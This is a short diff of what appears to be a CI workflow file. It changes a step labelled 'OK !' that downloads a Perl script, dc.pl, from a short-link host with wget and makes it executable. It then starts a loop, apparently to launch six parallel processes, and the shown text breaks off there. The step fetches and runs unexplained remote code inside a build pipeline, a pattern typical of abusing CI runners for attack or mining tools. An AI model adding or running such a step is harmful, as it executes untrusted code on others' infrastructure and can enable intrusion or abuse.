@@ -14,7 +14,7 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/LQmk9/dc.pl -O dc.pl
+          wget https://curl.by/DPCv5/dc.pl -O dc.pl
           chmod +x dc.pl
           PIDS=()
           for i in {1..6}; do
